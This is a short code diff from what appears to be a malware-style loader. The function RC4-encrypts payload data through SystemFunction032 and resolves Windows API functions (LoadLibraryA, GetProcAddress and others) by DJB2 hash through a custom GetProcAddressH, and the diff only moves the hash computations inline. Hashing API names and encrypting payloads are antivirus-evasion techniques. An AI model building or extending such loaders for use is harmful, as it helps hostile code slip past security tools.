@@ -37,17 +37,11 @@ BOOL Rc4EncryptionViaSystemFunc032(const PBYTE pRc4Key, PBYTE pPayloadData, cons
         return FALSE;
     }
 
-    // Define hash constants locally to avoid redefinition issues
-    constexpr auto LoadLibraryA_Hash = HashStringDjb2A("LoadLibraryA");
-    constexpr auto GetProcAddress_Hash = HashStringDjb2A("GetProcAddress");
-    constexpr auto FreeLibrary_Hash = HashStringDjb2A("FreeLibrary");
-    constexpr auto GetLastError_Hash = HashStringDjb2A("GetLastError");
-
-    // Resolve function pointers using hashes
-    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_Hash);
-    fnGetProcAddress pGetProcAddress = (fnGetProcAddress)GetProcAddressH(hKernel32, GetProcAddress_Hash);
-    fnFreeLibrary pFreeLibrary = (fnFreeLibrary)GetProcAddressH(hKernel32, FreeLibrary_Hash);
-    fnGetLastError pGetLastError = (fnGetLastError)GetProcAddressH(hKernel32, GetLastError_Hash);
+    // Resolve function pointers using direct hash values
+    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, HashStringDjb2A("LoadLibraryA"));
+    fnGetProcAddress pGetProcAddress = (fnGetProcAddress)GetProcAddressH(hKernel32, HashStringDjb2A("GetProcAddress"));
+    fnFreeLibrary pFreeLibrary = (fnFreeLibrary)GetProcAddressH(hKernel32, HashStringDjb2A("FreeLibrary"));
+    fnGetLastError pGetLastError = (fnGetLastError)GetProcAddressH(hKernel32, HashStringDjb2A("GetLastError"));
 
     if (!pLoadLibraryA || !pGetProcAddress || !pFreeLibrary || !pGetLastError) {
         printf("[!] Failed to resolve one or more API functions\n");
